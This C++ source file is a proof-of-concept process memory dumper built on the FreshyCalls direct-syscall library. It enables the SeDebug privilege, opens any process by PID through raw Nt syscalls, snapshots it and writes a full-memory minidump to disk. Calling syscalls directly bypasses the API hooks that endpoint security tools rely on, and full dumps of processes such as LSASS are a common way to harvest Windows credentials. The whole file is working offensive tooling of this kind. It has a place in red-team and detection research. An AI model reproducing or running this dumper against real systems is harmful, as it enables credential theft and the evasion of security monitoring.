// Copyright (c) 2020 ElephantSe4l. All Rights Reserved.
// Released under MPL-2.0, see LICENCE for more information.

#include "syscall/syscall.hpp"
#include <iostream>
#include <string>
#include <cstdint>
#include <Windows.h>
#include <winternl.h>
#include "processsnapshot.h"
#include <DbgHelp.h>
#pragma comment (lib, "Dbghelp.lib")

static auto &syscall = freshycalls::Syscall::get_instance();


BOOL CALLBACK SnapshotCallback(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
  switch (CallbackInput->CallbackType) {
    case 16: // IsProcessSnapshotCallback
      CallbackOutput->Status = S_FALSE;
      break;
  }
  return TRUE;
}

std::wstring StrToWStr(std::string_view str) {
  int no_chars = MultiByteToWideChar(CP_UTF8, 0, str.data(), str.length(), nullptr, 0);
  std::wstring wstr(no_chars, 0);
  MultiByteToWideChar(CP_UTF8, 0, str.data(), str.length(), LPWSTR(wstr.data()), no_chars);
  return wstr;
}

void ActivateSeDebug() {
  HANDLE token_handle{};
  TOKEN_PRIVILEGES token_privileges{};

  syscall.CallSyscall("NtOpenProcessToken", HANDLE(-1), TOKEN_ADJUST_PRIVILEGES, &token_handle)
      .OrDie("[ActiveSeDebug] An error happened while opening the current process token: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");

  token_privileges.PrivilegeCount = 1;
  // SeDebug's LUID low part == 20
  token_privileges.Privileges[0].Luid = {20L, 0};
  token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  syscall.CallSyscall("NtAdjustPrivilegesToken", token_handle, false, &token_privileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)
      .OrDie("[ActiveSeDebug] An error happened while activating SeDebug on current token: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");

  CloseHandle(token_handle);
}

HANDLE OpenProcess(uint32_t process_id) {
  HANDLE process_handle{};
  OBJECT_ATTRIBUTES obj{};

  InitializeObjectAttributes(&obj, nullptr, 0, nullptr, nullptr);
  CLIENT_ID client = {reinterpret_cast<HANDLE>(static_cast<DWORD_PTR>(process_id)), nullptr};

  syscall.CallSyscall("NtOpenProcess",
                      &process_handle,
                      PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE,
                      &obj,
                      &client)
      .OrDie("[OpenProcess] An error happened while opening the target process: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");

  return process_handle;
}

HANDLE CreateDumpFile(std::string_view file_path) {
  HANDLE file_handle{};
  IO_STATUS_BLOCK isb{};
  OBJECT_ATTRIBUTES obj{};
  UNICODE_STRING ntpath{};

  using FunctionDef = bool (__stdcall *)(PCWSTR, PUNICODE_STRING, PCWSTR *, VOID *);
  FunctionDef RtlDosPathNameToNtPathName_U =
      reinterpret_cast<decltype(RtlDosPathNameToNtPathName_U)>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlDosPathNameToNtPathName_U"));

  bool status = RtlDosPathNameToNtPathName_U(StrToWStr(file_path).data(), &ntpath, nullptr, nullptr);
  if (!status) {
    throw std::runtime_error(freshycalls::utils::FormatString("[CreateDumpFile] RtlDosPathNameToNtPathName_U failed: \"%s\" (Error Code: %ld)",
                                                              freshycalls::utils::GetErrorMessage(GetLastError()).data(),
                                                              GetLastError()));
  }

  InitializeObjectAttributes(&obj, &ntpath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

  syscall.CallSyscall("NtCreateFile", &file_handle,
                      FILE_GENERIC_WRITE,
                      &obj,
                      &isb,
                      nullptr,
                      FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
                      FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
                      nullptr,
                      0)
      .OrDie("[CreateDumpFile] An error happened while creating the dump file (Error Code: {{result_as_hex}})");

  return file_handle;
}

void Usage() {
  std::cerr << "FreshyCalls' PoC dumper usage: " << std::endl << std::endl;
  std::cerr << "\tdumper.exe -pid <process_id> <output_file>" << std::endl << std::endl;
}

uint32_t GetPID(int argc, char *argv[]) {
  if (argc < 4) {
    Usage();
    exit(-1);
  }
  if (std::string(argv[1]) == "-pid") {
    return std::stoul(argv[2], nullptr, 10);
  }

  Usage();
  exit(-1);
}

int main(int argc, char *argv[]) {
  HANDLE process_handle;
  HANDLE file_handle;
  const uint32_t process_id = GetPID(argc, argv);

  std::cout << "FreshyCalls' PoC dumper" << std::endl << std::endl;

  try {
    std::cout << "[+] Trying to activate SeDebug...";
    ActivateSeDebug();
    std::cout << " OK!" << std::endl;

    std::cout << "[+] Trying to open the process (PID: " << process_id << ")...";
    process_handle = OpenProcess(process_id);
    std::cout << " OK!" << std::endl;

    std::cout << "[+] Trying to create the dump file...";
    file_handle = CreateDumpFile(argv[3]);
    std::cout << " OK!" << std::endl;

    const uint32_t capture_flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CREATE_RELEASE_SECTION;
    HPSS snapshot_handle;

    std::cout << "[+] Trying to create a snapshot of the process...";
    const uint32_t snapshot_status = PssCaptureSnapshot(process_handle, PSS_CAPTURE_FLAGS(capture_flags), CONTEXT_ALL, &snapshot_handle);
    if (snapshot_status != 0) {
      std::cerr << freshycalls::utils::FormatString("An error happened while creating the snapshot of the target process: %s (Error Code: %#010x)",
                                                    freshycalls::utils::GetErrorMessage(snapshot_status).data(), snapshot_status);
      std::cerr << std::endl;
      exit(-1);
    }
    std::cout << " OK!" << std::endl;

    MINIDUMP_CALLBACK_INFORMATION callback_info = {&SnapshotCallback, nullptr};

    std::cout << "[+] Trying to dump the snapshot...";
    if (!MiniDumpWriteDump(snapshot_handle, process_id, file_handle, MiniDumpWithFullMemory, nullptr, nullptr, &callback_info)) {
      std::cerr << freshycalls::utils::FormatString("An error happened while dumping the snapshot of the target process: %s (Error Code: %#010x)",
                                                    freshycalls::utils::GetErrorMessage(GetLastError()).data(),
                                                    GetLastError());
      std::cerr << std::endl;
      exit(-1);
    }
    std::cout << " OK!" << std::endl;

  }
  catch (const std::runtime_error &e) {
    std::cerr << std::endl << e.what() << std::endl;
    exit(-1);
  }

  std::cout << std::endl << "Dump at " << argv[3] << std::endl;
  std::cout << "Enjoy!" << std::endl;

  return 0;
}
